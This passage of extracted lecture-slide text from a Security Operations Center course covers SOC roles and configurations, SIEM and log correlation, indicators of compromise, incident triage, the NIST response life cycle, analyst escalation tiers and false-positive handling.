audits.\nIdentifies and resolves vulnerabilities before attackers exploit them.\n\nComponents of a SOC\nSize and Scope:\nVaries from a small team to a 24/7 global operation.\nFunctions include alarm monitoring, access control, and camera surveillance.\nCan be centralized or virtual.\nBeyond Security Functions:\nMay handle crisis communication and material safety data sheets.\nEmphasizes training, procedures, and documentation.\n\nComponents of a SOC : People\nSOC Manager: Oversees the SOC team and ensures effective incident response and threat management\nSecurity Analysts: Monitor alerts, investigate potential security incidents, and perform threat-hunting\nIncident Responders: Act quickly to contain and mitigate security incidents\nThreat Intelligence Analysts: Gather and analyze threat intelligence to stay ahead of emerging threats\nForensic Analysts: Conduct forensic investigations and collect evidence\n\nComponents of a SOC : Processes\nIncident Detection and Response: Systematic workflows for detecting, investigating, and responding to security incidents\nThreat Hunting: Proactively searching for threats that may have evaded automated detection\nVulnerability Management: Regular assessments and remediation of vulnerabilities\nCompliance Management: Ensuring adherence to relevant regulations and standards\n\nComponents of a SOC: Technology\nSecurity Information and Event Management (SIEM): Aggregates and analyzes data from various sources to provide real-time visibility of security alerts\nIntrusion Detection Systems (IDS) and Intrusion Prevention Systems (IPS): Monitor network traffic for suspicious activities and take action to prevent attacks\nEndpoint Detection and Response (EDR): Provides visibility into endpoint activities and detects malicious behaviour\nThreat Intelligence Platforms: Collect and analyze threat data to provide insights into attacker behaviour and emerging threats\nAutomation Tools: Automate repetitive tasks and incident response actions to improve efficiency\n\nSOC Functions, Objectives, and Benefits\nSOC Functions\nContinuous Monitoring: SOC teams monitor networks, systems, and applications 24/7 to detect suspicious activities using tools like Security Information and Event Management (SIEM) systems\nThreat Intelligence: They gather and analyze threat intelligence to stay updated on the latest cyber threats and trends\nIncident Detection and Response: SOC analysts investigate and respond to security incidents promptly to minimize impact\nIncident Prevention: Regular assessments and penetration testing help identify and address vulnerabilities in the organization's infrastructure2\nContinuous Improvement: SOCs constantly refine their processes and tools to stay ahead of evolving cyber threats\n\nSOC Objectives\nEarly Threat Detection: Identify potential threats early to prevent escalation\nRapid Response: Ensure quick and effective response to security incidents\nMinimize Downtime: Reduce the impact of security incidents on business operations\nProtect Assets: Safeguard the organization's data, systems, and networks\nCompliance: Ensure adherence to industry, national, and global privacy regulations\n\nSOC Benefits\nEnhanced Security Posture: Improved threat protection and faster detection\nReduced Financial Losses: Minimize the financial impact of security incidents\nIncreased Customer Confidence: Boost customer trust by demonstrating robust cybersecurity measures\nOperational Efficiency: Streamline security operations and improve response times\nRegulatory Compliance: Simplify compliance with various regulations and standards\n\nKey roles and responsibilities within a SOC Team \nTypes of SOC configuration\nIn-House SOC (Dedicated):\nFully operated by the organization with full-time staff.\nOffers greater control and customization but requires significant investment.\nManaged SOC (M-SOC):\nSecurity monitoring is outsourced to a third-party provider.\nCost-effective for organizations lacking internal security expertise.\nHybrid SOC:\n Mix in-house and managed elements.\nProvides flexibility by outsourcing specific security functions while retaining others internally.\nVirtual SOC (V-SOC):\nOperates remotely via cloud-based tools.\nIdeal for distributed teams and cloud-centric security approaches.\n\nCo-Managed SOC:\nShared responsibility between the organization and a Managed Security Service Provider (MSSP).\nRetains oversight while leveraging external expertise.\nThird-Party SOC Considerations\nPricing and Service Level Agreements (SLAs):\nClearly define SLAs to ensure required services are met.\nAddress potential IT security risks with third-party providers.\nSmaller Organizations:\nConsider cost-effective options like co-managed or virtual SOCs.\n\nDetermining SOC Needs\nPrimary Mission:\nEnsure SOC tasks align with core business security needs.\nAllow additional responsibilities if they don’t compromise security functions.\nNeeds Assessment:\nConduct evaluations before expanding SOC capabilities.\nIdentify essential SOC functions and roles.\n\nSOC Duties and Responsibilities\u000b\nPredefined Actions:\nFollow documented procedures for handling security events.\nAvoid judgment-based decision-making—critical decisions should be escalated to security management.\nSOC Functions:\nMonitor access control and alarm systems.\nOversee environmental factors like HVAC and moisture sensors.\nManage incident and report handling.\nBeyond Security:\nActs as a crisis communication centre.\nSupports after-hours employee security concerns.\n\nNeeds Assessment for SOC Implementation\u000b\nCoordination with Other Departments:\nSOC functions should align with company operations, industry regulations, and risk factors.\nRisk Assessment:\nThird-party assessments provide an objective evaluation.\nExternal audits offer fresh perspectives to enhance SOC effectiveness.\n\nTypes of Companies and SOC Configurations\nSingle Suite in a Larger Office: Minimal setup, often overlooked but essential.\nSingle Location Dedicated to Company: Requires flexibility for 24/7 operations.\nSingle Campus with Multiple Buildings: Onsite SOC is preferable due to its complexity.\nMultiple Locations in a Metro Area or Across Countries: Requires tailored SOC configurations.\n\nAdditional Considerations\nFacility Ownership:\nLeased vs. owned buildings influence SOC responsibilities (e.g., fire alarm monitoring).\nLaw Enforcement Coordination:\nBuilding trust with law enforcement ensures efficient response times.\nLong-term credibility strengthens security measures.\n\n\nSOC’s Role in Incident Detection, Response, and Prevention\u000b\nSOC's role in incident detection\nContinuous Monitoring: SOC teams use advanced tools to monitor networks, systems, and applications 24/7 for any suspicious activities.\nThreat Intelligence: They stay updated on the latest cyber threats and trends, allowing them to identify potential vulnerabilities and emerging threats.\nSecurity Information and Event Management (SIEM): SIEM systems aggregate and analyze data from various sources, providing real-time visibility of security alerts.\n\nSOC's role in response\nRapid Response: When a security incident occurs, SOC analysts investigate and respond promptly to minimize the impact.\nCoordination: They work with IT teams and senior management to ensure an effective incident response plan.\nContainment and Eradication: SOC teams contain the threat, eradicate it, and recover affected systems to normal operations.\n\nSOC's role in prevention\nVulnerability Management: Regular assessments and penetration testing help identify and address weaknesses in the organization's infrastructure\nProactive Measures: By analyzing threat intelligence, SOC teams can enhance defence mechanisms and implement proactive measures to prevent future incidents\nContinuous Improvement: SOCs constantly refine their processes and tools to stay ahead of evolving cyber threats\nOverall, SOCs are essential for maintaining a robust cybersecurity posture, ensuring that organizations can detect, respond to, and prevent cyber incidents effectively.\n\nReferences \u000b\nJarpey, G., & McCoy, R. S. (n.d.). Security Operations Center Guidebook: A Practical Guide for a Successful SOC. \nSpiceworks. Understanding SOC, Its Components, Setup, and Benefits. Retrieved from Spiceworks.\nMoldStud. The Role of Security Operations Centers in Incident Detection and Response. Retrieved from MoldStud.\nAKATI Security. What is a SOC: Functions, Roles, Benefits, Challenges. Retrieved from AKATI Security.\nDiscussion\nThe Difference between the Security Operations Center (SOC) & Network Operations Center (NOC)\nStudent Activity1: Cybersecurity Case Studies\n\nObjectives\nResearch and analyze cyber security incidents.\nPart 1: Conduct search of high profile cyberattacks.\nPart 2: Write an analysis of a cyberattack.\nLab setup\nUnderstand the purpose of using Splunk, Wireshark \nSplunk, Wireshark tools installation and explore its features\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Spring 25 - Lecture 2-  Security Monitoring and Incident Detection.pptx": "Lecture 2:\nSecurity Monitoring and Incident Detection\nObjectives\nUnderstand Log and event collection, correlation, and analysis\nUnderstanding Security Information and Event Management (SIEM) systems\nUnderstand Indicators of Compromise (IoC) and Tactics, Techniques, and Procedures (TTPs)\nUnderstand Real-time monitoring and anomaly detection\n\nLog and event collection, correlation, and analysis\nIntroduction\n\tSecurity monitoring and incident detection are essential functions for SOC analysts, providing them with the necessary tools to safeguard the organization against cyber threats. By enabling early detection of threats and mitigating potential damage, analysts can respond swiftly. Real-time visibility into the organization's IT environment allows analysts to monitor network traffic, system logs, and user activities, promptly identifying anomalies and suspicious behaviour. Log and event collection, correlation, and analysis are essential activities within a Security Operations Center (SOC), particularly from the perspective of a SOC analyst. \nLog and Event Collection\u000b\nLog and event collection involves gathering data from various sources within an organization's IT infrastructure. These sources include:\nNetwork Devices: Routers, switches, firewalls.\nServers: Web servers, database servers, application servers.\nEndpoints: Workstations, laptops, mobile devices.\nSecurity Devices: Intrusion detection/prevention systems (IDS/IPS) and antivirus software.\nApplications: Custom applications, cloud services\n\n\n\nLog and Event Correlation\u000b\nLog correlation is the process of analyzing log data from different sources to identify patterns or sequences of events that may indicate a security threat. This involves:\nTime-Based Correlation: Matching events that occur within a specific time frame.\nRule-Based Correlation: Using predefined rules to identify suspicious activities.\nPattern-Based Correlation: Detecting known attack patterns.\nTopology-Based Correlation: Understanding the network topology to correlate events more effectively\nCorrelation rules may be based on predefined signatures, behavioral patterns, threat intelligence, or machine learning algorithms.\nEffective correlation helps SOC analysts identify complex attack scenarios, such as advanced persistent threats (APTs) or insider threats, that may go unnoticed when analyzing individual events in isolation.\n\n\nLog and Event Analysis\u000b\nLog analysis involves examining collected log data to detect and investigate security incidents. This process includes:\nNormalization: Converting log data into a consistent format for easier analysis.\nAggregation: Combining similar events to reduce the volume of data.\nAlerting: Generating alerts for suspicious activities based on predefined criteria.\nVisualization: Using dashboards and reports to present log data in an understandable way.\nAnalysts may use manual investigation techniques, such as querying log data, conducting packet captures, or performing endpoint forensics, to gather additional evidence and validate suspicions.\nAnalysis also involves assessing the impact of security incidents on the organization's systems, data, and operations, as well as identifying appropriate response measures to mitigate risks and restore normalcy.\n\n\n\n\nTools and Technologies\u000b\nSIEM (Security Information and Event Management): A central tool for collecting, correlating, and analyzing log data. SIEM solutions provide real-time monitoring, threat detection, and incident response capabilities.\nLog Management Tools: These tools focus on collecting, storing, and managing log data, and they are often used with SIEM systems.\n\n\nBenefits\u000b\nImproved Threat Detection: Identifying potential threats in real-time.\nEnhanced Incident Response: Quickly responding to and mitigating security incidents.\nCompliance: Meeting regulatory requirements by maintaining detailed logs and audit trails.\n\nSecurity Information and Event Management (SIEM) Systems\nWhat is SIEM?\nSecurity Information and Event Management (SIEM) systems are critical tools utilized within Security Operations Centers (SOCs) \nSIEM systems collect, aggregate, and analyze log and event data from various sources within an organization's IT infrastructure. This data is used to detect, investigate, and respond to security incidents in real-time.\nThese systems play a central role in enhancing cybersecurity by providing comprehensive visibility into security events and facilitating timely incident detection and response.\nKey Components of SIEM\nLog Management involves collecting and storing log data from various sources, such as network devices, servers, and applications.\nEvent Correlation: Analyzing log data to identify patterns or sequences of events that may indicate a security threat.\nContinuous Monitoring: Providing real-time visibility into an organization's security posture.\nIncident Response: Enabling quick detection and response to security incidents\n\n\nBenefits of SIEM\nEnhanced Threat Detection: By correlating data from multiple sources, SIEM systems can detect complex threats that might go unnoticed by individual security tools.\nImproved Incident Response: SIEM systems provide actionable insights that help security teams respond to incidents more effectively.\nCompliance: SIEM systems help organizations meet regulatory requirements by maintaining detailed logs and audit trails\n\n\nEvolution of SIEM\u000b\nSIEM technology has evolved significantly over the years. Early SIEM systems focused primarily on log management and compliance reporting. Modern SIEM solutions incorporate advanced analytics, machine learning, and AI to enhance threat detection and response capabilities\nIndicators of Compromise (IoC) and Tactics, Techniques, and Procedures (TTPs)\nIndicators of Compromise (IoC)\nIndicators of Compromise (IoCs) are pieces of forensic data that suggest a network or system has been breached. They help security professionals detect and respond to potential threats. Examples of IoCs include:\nUnusual Network Traffic: Unexpected spikes or patterns in network traffic.\nUnexpected Software Installations: Installation of software without user consent.\nAnomalous User Behavior: Sign-ins from unusual locations or at odd times.\nChanges to System Configurations: Unauthorized modifications to system settings\n\nTactics, Techniques, and Procedures (TTPs)\nTactics, Techniques, and Procedures (TTPs) describe the behaviour and methods used by threat actors to carry out cyberattacks. Understanding TTPs helps organizations anticipate and defend against potential threats. Here's a breakdown:\nTactics: The overall strategy or goal of the threat actor (e.g., data exfiltration).\nTechniques: The general methods used to achieve the tactic (e.g., phishing).\nProcedures: The specific steps taken to execute the technique (e.g., crafting a phishing email with a malicious link)\n\nImportance in Cybersecurity\nIoCs: Help identify and mitigate known threats by providing evidence of a breach.\nTTPs: Offer insights into the behaviour of threat actors, enabling proactive defence measures\n\nExample of IoC and TTPs:\nIndicator of Compromise (IoC) Example:\nSuspicious outbound network traffic to known malicious IP addresses.\nUnexpected modifications to critical system files.\nAnomalous login attempts from unfamiliar locations or devices.\nTactics, Techniques, and Procedures (TTPs) Example:\nPhishing emails containing malicious links or attachments to deliver malware.\nExploiting software vulnerabilities to gain unauthorized access to systems.\nUsing stolen credentials to move laterally within a network and escalate privileges.\n\nReal-time monitoring and anomaly detection\nReal-Time Monitoring\nReal-time monitoring involves continuously observing an organization's IT infrastructure to detect and respond to security incidents as they happen. Key components include:\nSecurity Information and Event Management (SIEM): Collects and analyzes log data from various sources to provide real-time alerts.\nNetwork Monitoring Tools: Track network traffic and identify unusual patterns.\nEndpoint Detection and Response (EDR): Monitors endpoints like computers and mobile devices for suspicious activity.\n\nAnomaly Detection\nRule-Based Detection (Signature-Based)\nUses predefined signatures of known attacks (e.g., malware hash, known bad IPs).\nEffective for detecting known threats but fails against zero-day attacks.\nBehavioral-Based Detection\nEstablishes a baseline of normal behaviour and detects deviations.\nHelps detect insider threats and zero-day attacks.\nMachine Learning & AI-Based Detection\nUses algorithms to analyze large datasets and identify anomalies.\nCan detect complex attacks like fileless malware and low-and-slow attacks.\nUser and Entity Behavior Analytics (UEBA)\nMonitors user activities and detects deviations from usual patterns.\nExample: If an employee logs in from two different countries within an hour, it's flagged as impossible travel.\n\nKey Anomalies to Detect in Cybersecurity\nUnusual Network Traffic\nLarge data transfers outside normal business hours.\nTraffic to or from known malicious IP addresses.\nUnauthorized Access Attempts\nMultiple failed login attempts (brute-force attacks).\nLogins from unusual locations (e.g., foreign IPs).\nUnusual File Modifications\nSudden encryption of multiple files (ransomware attack).\nCreation of new admin accounts.\nProcess and Service Anomalies\nUnexpected execution of PowerShell or script files.\nMalware or unauthorized software running in memory.\n\nBenefits\nEarly Threat Detection: Identifies potential threats before they can cause significant damage.\nImproved Incident Response: Enables quicker and more effective responses to security incidents.\nReduced False Positives: Advanced techniques help minimize false alarms, allowing analysts to focus on genuine threats.\n\n\nChallenges\u000b\nAlert Fatigue: The high volume of alerts can overwhelm analysts.\nComplexity: Implementing and managing these systems can be complex and resource-intensive.\nData Privacy: Ensuring that monitoring activities comply with data privacy regulations.\n\nTools for Real-Time Monitoring & Anomaly Detection\nSIEM Solutions: Splunk, ELK Stack, Microsoft Sentinel.\nEDR Solutions: CrowdStrike Falcon, Carbon Black, SentinelOne.\nNTA Solutions: Darktrace, ExtraHop, Corelight.\nAI/ML-Based Solutions: Palo Alto Cortex XDR, Vectra AI, Exabeam. \nIn summary, real-time monitoring and anomaly detection are critical capabilities for SOC operations, enabling organizations to detect and respond to security threats effectively. \nReal-time monitoring provides continuous visibility into the organization's IT environment, while anomaly detection helps identify abnormal behaviors or activities that may indicate potential security incidents. Together, these capabilities empower organizations to detect and mitigate security threats promptly, enhancing their overall cybersecurity posture.\nBy combining real-time monitoring with anomaly detection methods, organizations can enhance their ability to detect and respond to security threats effectively, improving their overall cybersecurity posture.\n\nREFERENCES\nJarpey, G., & McCoy, R. S. (Year). Security Operations Center Guidebook: A Practical Guide for a Successful SOC (Chapters 3 & 4). Publisher.\nClearNetwork, Inc. SOC analysts: How they identify and respond to security incidents. Retrieved from [https://www.clearnetwork.com/]\nDarktraceReimagining your SOC: Overcoming alert fatigue with AI-led investigations. Darktrace Blog. Retrieved from [https://darktrace.com/]\n[MindPoint Group’s]. What types of logs or data can be sent to a SOC? Retrieved from [https://www.mindpointgroup.com/]\nMicrosoft. What are indicators of compromise (IoC)? Microsoft Security. Retrieved from [https://learn.microsoft.com/]\nClass activity\u000bReview on ICMP message types\nSymptoms of network attack-an example\nReference:  Detecting Network Attacks with Wireshark – InfosecMatter\n\nRefer to the following exhibit of Wireshark output and \u000banswer the following questions.\nWhat is the targeted device by the attacker? Justify your answer.  \nWhat is the Indicator of Compromise (IoC) in the above incident? Explain it briefly. \nWrite the filter rules used by the SOC analysist to obtain the above result from the Wireshark captures for the above incident investigation. \nLab activity-1  SIEM Labs using Splunk\n\nExploring Features of Splunk Enterprise\nInjecting logs and investigate  \nLink -> \nLab Activity 1 - Using Splunk.pdf\n",
    "C:\\Users\\UTASI\\OneDrive\\Desktop\\PI\\Security Operations Centers (SOCs)\\Spring 25 - Lecture 3 - Incident Classification and Triage.pptx": "Lecture 3\nIncident Classification and Triage\nObjectives\nAfter studying this chapter, you should be able to:\nUnderstand the meaning of Incident Classification and Triage\nUnderstand Incident categorization and prioritization\nUnderstanding Triage Analysis Process\nUnderstand Incident response workflows and procedures\nUnderstand Escalation processes and communication protocols\nUnderstand Handling false positives and false negatives\n\n\n\nIncident Classification and Triage\nIncident Classification : \nIncident classification is the systematic categorization of incidents based on attributes such as severity, impact, nature, and resources affected. This process enables organizations to understand the nature of an incident and allocate appropriate resources for its resolution.\nIncident Triage: \nA critical incident response process that allows security teams to sort through a flood of alerts and potential threats to identify the most pressing issues. It involves immediately analyzing and prioritizing security events based on severity so that resources can be allocated accordingly. Incident Triage is a systematic method for prioritizing incidents based on their impact and urgency, thereby enabling a more effective and timely response\nIncident Classification and Triage\nThe importance of triage in incident response cannot be overstated. It serves several crucial functions:\nEfficient Resource Allocation: Prioritizes incidents based on urgency and impact, optimizing the use of resources.\nMinimized Downtime: Swiftly addresses high-priority incidents, reducing disruption to business operations.\nRisk Mitigation: Focuses on addressing threats with the greatest potential impact, preventing further escalation.\nEnhanced Coordination: Establishes clear communication channels and decision-making processes among response teams.\nImproved Stakeholder Communication: Enables transparent communication with stakeholders about incident severity and response timelines.\nCompliance and Reporting: Helps demonstrate compliance with regulatory requirements through timely incident response and accurate reporting. \nIncident Classification and Triage\nIn summary, triage streamlines resource allocation, minimizes downtime, mitigates risks, enhances coordination, facilitates communication, and ensures compliance, enabling organizations to manage and mitigate the impact of cybersecurity threats and operational disruptions effectively.\n\nIncident categorization and prioritization\n\nIncident categorization and prioritization\nIncident categorization and prioritization can be achieved through structured methodologies and frameworks. Here's an outline of the typical methods used for each:\nIncident Categorization Methodology:\nTaxonomy Creation: Develop a taxonomy or classification scheme that defines categories and subcategories based on incident attributes such as nature, severity, impact, and affected resources. This taxonomy should be tailored to the specific needs and context of the organization.\nIncident Identification: When an incident occurs, assess its characteristics and attributes to determine the appropriate category within the established taxonomy.\nCategorization Criteria: Define clear criteria for assigning incidents to specific categories, ensuring consistency and accuracy in classification. Consider factors such as the type of incident, the systems or data affected, and the potential impact on operations.\nDocumentation: Document the categorization process, including the rationale behind assigning incidents to specific categories. This documentation serves as a reference for incident responders and helps maintain consistency across incidents.\nIncident categorization and prioritization\nIncident Prioritization Methodology:\n Priority Criteria Definition: Define criteria for prioritizing incidents based on factors such as urgency, criticality, potential impact on operations, and regulatory requirements. These criteria should align with the organization's objectives and risk tolerance.\nScoring or Ranking: Develop a scoring or ranking system to assess incidents against the defined priority criteria. This may involve assigning numerical scores or using qualitative assessments to determine the priority level of each incident.\n Thresholds or Thresholds: Establish thresholds or thresholds for each priority level to guide decision-making and resource allocation. For example, high-priority incidents may require immediate action, while lower-priority incidents can be addressed within predefined time frames.\n Review and Adjustment: Regularly review and refine the prioritization methodology based on feedback, lessons learned from previous incidents, and changes in the organization's risk landscape. Continuously improving the prioritization process ensures its effectiveness in guiding incident response efforts.\nUnderstanding Triage Analysis Process\nWhen a security alert or event comes in, the triage process kicks off with some initial detection and validation steps. Analysts will look to confirm whether a real incident has taken place or if an alert is just a false positive.\nUnderstanding Triage Analysis Process\nTriage analysis process steps:\nDetection – Validate security alert or event as a real incident vs. false positive\nScoping – Quickly investigate incident to surface attack details, affected assets, related indicators, etc.\nSeverity Classification – Assign severity level (low/medium/high) based on potential impact and damage\nEscalation – Report the incident to appropriate parties based on the severity threshold\nContainment – Initiate containment of high/critical incidents to isolate and limit damage\nQueuing – Add lower severity incidents to the queue for future response based on resources\nEradication – For severe events, execute steps to eliminate threats from the environment\nRecovery – For severe events, start restoration of impacted systems and data\nCircle Back – Continuously analyze and Triage new security alerts as they come in\nUnderstanding Triage Analysis Process\nLet’s say you’ve identified multiple alerts, and you want to find out which ones you can safely ignore, and which are important.  To accomplish this objective, it’s useful to separate alerts into the following three categories:  \nLow-priority: Alerts that are unlikely to have any significant impact on business performance or customer satisfaction. \nMedium-priority: Alerts that may have some impact on business performance or customer satisfaction, but their resolution can be delayed.  \nHigh-priority: Alerts that are likely to have a serious impact on business performance or customer satisfaction unless resolved immediately.\n\nUnderstanding Triage Analysis Process\nSo, what kind of criteria should you take into consideration when categorizing your alerts? That’s where the IT Infrastructure Library (ITIL) series of best practices for managing information systems can help.  \nAccording to ITIL, alerts can be prioritized based on the following criteria:   \nImpact: How severely will the business be affected.   \nUrgency: How long can the resolution be delayed.\nAn alert’s priority is the combination of its impact and urgency. The incident triage matrix below can help you correctly prioritize your alerts.\nUnderstanding Triage Analysis Process (Excluded)\nITIL Incident Management Priority Matrix\nITIL Incident Management Priority Matrix (buildahelpdesk.com)\n\n\nIncident Triage Matrix​\nExamples of Triage Cybersecurity Incidents (1)\nHeavy Traffic on Port 80 (Low-Priority)\nPort 80 is the port number assigned to Hypertext Transfer Protocol (HTTP) which is used to send and receive unencrypted web pages. Heavy traffic on this port is often caused by employees downloading content from the web. In most cases, the content is work-related and safe, but it could also be illegal content from various shady websites that are plagued with malware, so an in-depth investigation may be needed, especially if the spikes in traffic are detected after business hours.\nExamples of Triage Cybersecurity Incidents (2)\nPhishing Attempt (Medium-Priority)\nIt’s estimated that phishing attacks account for more than 80 percent of reported security incidents. The detection of a phishing attempt typically isn’t a highly urgent issue, but it can potentially have a serious impact on business performance. The proper response to a phishing attempt is to block the sender’s address and educate employees about the threat so they can recognize it and avoid it – even if the same or similar phishing attempts arrive from a different email address.\nIncident response workflows and procedures\nIncident response workflows and procedures\nIncident response encompasses a structured approach to addressing and mitigating cybersecurity incidents within an organization.\nIt’s a structured process organizations use to identify and deal with cybersecurity incidents. The National Institute of Standards and Technology (NIST) framework or NIST framework for incident response includes four stages: preparation and prevention; detection and analysis; containment, eradication, and recovery; and post-incident activity.\nThe NIST Incident Response Life Cycle\nPreparation: This crucial phase entails a comprehensive examination of security policies, laying the groundwork for the incident response plan. It serves as an opportune moment for conducting risk assessments, identifying assets warranting heightened security focus by the team. It is imperative to establish a coherent communication strategy and a document delineating clearly assigned roles and responsibilities during security incidents.\n2) Detection: This stage is crucial because this is the stage when the team must be able to detect any security breach or incident. The team must keep a close check on operations and capture any deviation that occurs in the usual operational cycle in the organization, which can be a potential security breach. As soon as a potential incident is detected, the team must find more evidence that helps to understand the nature, type, and severity of the incident. The team must also document all the actions taken. The documentation must be detailed and contain clear information like the “who, when, where, why, and how” of the incident.\n\n\nThe NIST Incident Response Life Cycle\n3.1)  Containment: As soon as the incident has been detected by the team, the next course of action is the containment of the incident so that any further damage can be prevented. Containment can either be short-term or long-term.\nShort-term containment could be a simple step of isolation of one particular network where the attack occurred. Long-term containment may include using short-term fixes and applying them to the affected network to ensure production continuity while new and clean systems are built afresh.\n3.2) Eradication: The next step for the incident response team is to identify the root cause of the incident or threat and take immediate remedial actions to prevent any future occurrence. For instance, if the error happened owing to a weak process of authentication, the process of authentication needs to be made strong immediately\n3.3) Recovery: As the name suggests, this is the time when the team takes steps to restore the affected systems and resume production with utmost care to prevent any reoccurrence of the incident. This stage also involves critical decisions to be taken regarding the suitable time for restoration of the operations, methods, and duration of monitoring the impacted system during production to ensure normalcy.\n4)Post-incident follow-up: This is a stage that must be completed within two weeks of the occurrence of the incident. This stage aims to patch any gaps in documentation that could not be completed earlier and conclude a 360-degree evaluation of the incident in terms of the reason for its occurrence, and actions taken to remediate contain and eradicate the incident.\n\n\nEscalation processes and communication protocols\nEscalation processes\n          In a Security Operations Center (SOC), escalation processes and communication protocols are critical for ensuring efficient incident response and effective collaboration among team members. Here’s an overview of key components: Escalation Processes \nInitial Triage: When an alert is generated, the SOC analyst conducts initial triage to determine the severity and potential impact of the incident. Analysts categorize alerts based on predefined criteria (e.g., critical, high, medium, low).\nIncident Verification: Analysts verify whether the alert is a true positive or a false positive. This may involve additional investigation and correlation with other data sources.\nEscalation Criteria: \nSeverity Level: Incidents classified as high or critical typically require immediate escalation.\nImpact Assessment: Incidents affecting critical systems or sensitive data are escalated promptly.\nTime Sensitivity: Incidents that require urgent response due to potential ongoing exploitation are prioritized for escalation.\nEscalation Levels: \nLevel 1: Initial SOC analysts handle routine alerts. If unresolved or deemed critical, escalate to Level 2.\nLevel 2: More experienced analysts or incident responders handle complex incidents. If further expertise is needed, escalate to Level 3 or management.\nLevel 3: Senior security personnel or subject matter experts (SMEs) manage severe incidents requiring deep analysis and remediation strategies.\nDocumentation: Each escalation includes thorough documentation of findings, actions taken, and rationale for escalation, ensuring continuity and transparency.\nCommunication Protocols\nInternal Communication:\nUse of collaboration tools (e.g., Slack, Microsoft Teams) for real-time communication among SOC members.\nRegular team meetings to discuss ongoing incidents, share insights, and update procedures.\nIncident Reporting:\nFormal incident reports are created for significant events, detailing the incident timeline, analysis, response actions, and recommendations for future prevention.\nStakeholder Communication:\nDefined protocols for communicating with relevant stakeholders (IT teams, management, legal, etc.) depending on the incident severity and impact.\nTimely updates are provided to stakeholders about the incident status, potential impact, and remediation efforts.\nExternal Communication:\nIn cases of breaches or significant incidents, protocols for communicating with external parties (customers, partners, regulatory bodies) are established to manage public relations and legal obligations.\nPost-Incident Review:\nConducting a post-incident review or debrief to assess the response, identify areas for improvement, and update escalation processes and communication protocols as necessary.\n\nImportance of Escalation processes  \nEfficiency: Streamlined escalation processes enable quicker responses to incidents, minimizing potential damage.\nClarity: Clear communication protocols ensure that all team members and stakeholders are informed and aligned during incidents.\nContinuous Improvement: Regular reviews of escalation and communication practices help refine processes, leading to better incident handling in the future.\nBy establishing robust escalation processes and communication protocols, a SOC can enhance its ability to detect, respond to, and recover from security incidents effectively.\n\nIn a Security Operations Center (SOC), analysts are typically categorized into tiers based on their experience and responsibilities. \nTier 1 Analysts primarily focus on monitoring and triaging alerts, spending the majority of their time on initial assessments. \nTier 2 Analysts dive deeper into investigations and response activities, balancing between handling incidents and threat hunting. \nTier 3 Analysts provide expert insights for complex situations, contribute to continuous improvement, and mentor lower-tier analysts.\n Tier 1 Analyst Responsibilities:[Excluded]\nAlert Monitoring: Continuously monitor security alerts generated by security tools (e.g., SIEM, intrusion detection systems).\nInitial Alert Triage: Monitoring security dashboards, reviewing alerts, and determining if they are false positives or require further investigation.\nEscalation: Escalating potential incidents to Tier 2 analysts with initial findings.\nBasic Incident Response: Handling straightforward incidents, such as basic malware removal or account lockouts.\nReporting and Documentation: Documenting actions taken and maintaining logs.\nContinuous Learning: Keeping up to date with the latest security threats and trends.\n\nTier 2 Analyst Responsibilities: [Excluded]\nAdvanced Investigation: Conducting detailed analysis of escalated incidents, including log analysis, forensic examination, and root cause analysis.\nIncident Response: Manage the response on implementing containment, eradication, and recovery measures for incidents.  \nThreat Hunting: Working with IT, development, and other teams to mitigate threats. Actively search for potential threats within the environment that may not be captured by automated alerts.\nDocumentation: Create detailed incident reports and maintain records for compliance and future reference.\nTraining and Mentorship: Providing guidance and training to Tier 1 analysts.\n\nTier 3 Analyst Responsibilities: [Excluded]\nExpert Analysis(Advanced Threat Hunting): Proactively searching for threats using threat intelligence, behavior analysis, and anomaly detection. Provide deep technical expertise for complex incidents and emerging threats.\nRoot Cause Analysis: Conduct thorough investigations to determine the root cause of security incidents and recommend remediation measures. Complex Incident Handling in which Managing and resolving high-severity incidents, including advanced persistent threats (APTs).\nProcess Improvement(Tool and Technique Development): Develop and refine detection rules, incident response procedures, and security policies based on findings.\n Threat Intelligence: Analyzing threat intelligence feeds, understanding emerging threats, and adapting defenses accordingly.\nStrategic Planning and Research: Conducting security research, developing response strategies, and improving security posture through Train and mentor Tier 1 and Tier 2 analysts, sharing knowledge and best practices.\nTime Allocation: [Excluded]\nTier-1 Example\nAlert Monitoring: 60%\nInitial Triage: 20%\nBasic Investigation: 15%\nDocumentation and Reporting: 5%\nTier-2 Example\nAdvanced Investigation: 50%\nIncident Response: 30%\nThreat Hunting: 10%\nDocumentation and Reporting: 10%\nTier 3 Example\nExpert Analysis: 40%\nRoot Cause Analysis: 30%\nProcess Improvement: 20%\nMentoring and Training: 10%\nHandling false positives and false negatives\n\nWhat are false positives? \nSecurity Information and Event Management (SIEM) platform aggregates log data from every corner of your organization and analyzes it for signs of unauthorized activity. When observed activity matches a preconfigured detection rule, it triggers an alert which prompts an investigation. \nChallenges of dealing with false positives \nAlert fatigue is one of the biggest problems security leaders face due to false positives. Its impacts include: \nOverwhelming backlogs. When there are more alerts than analysts can quickly address, a backlog builds up. This backlog impacts key performance metrics like Mean Time-to-Detect (MTTD) and Mean Time-to-Respond (MTTR). \nWasted time and inefficiency. Every false positive requires time and security resources that should have gone towards addressing real cyber-attack risks. Removing false positives from the alert backlog helps security leaders use analyst time effectively. \nIncreased risk from undetected actual threats. False negatives are potential threats that go undetected despite having the appropriate rules in place. When analysts fail to investigate security threats in time, there is a much higher chance that detectable risks will slip through the organization's defenses. \nSometimes, false positives can be difficult to identify and control without investing in additional security capabilities. Reducing false positives means gaining deeper insight into security events at a crucial time—after detection but before investigation. \nFalse positives in threat detection [Excluded]\nUnderstand the need to create exceptions, adjust detection logic and rules, implement processes to handle alerts and manage false positives when identifying cyber threats\nBefore we talk about False Positives, we need to understand what case studies are. \nA case study aims to detect a threat scenario by mapping malicious patterns present in logs, network communications, etc. \nFinally, this detection can be implemented in a security solution, such as SIEM (Security Information and Event Management), which will correlate this information and generate alerts.\nSIEM workflow. Source: MITRE\nStrategies for reducing false positives \nWhen it comes to reducing false positives, SIEM configuration is the single most important factor security leaders have control over. When security teams implement SIEM platforms but leave them in their default configuration, the result is often a surge in false positives. \nFine-tuning alert rules and thresholds is one of the best ways to reduce false positives. This can be a complex task, but it pays impressive dividends over time. \nEvery organization has unique operational characteristics and business logic. A properly configured SIEM must take those factors into account when analyzing log data and triggering alerts. \nFor example, many SIEMs trigger alerts when users log in from unusual geographical regions by default. This makes sense in a traditional business with on-site employees. In a fully remote working environment staffed by employees from all over the globe, it may not produce meaningful results. \nSecurity leaders will also need to implement new technologies and capabilities as they are made available. 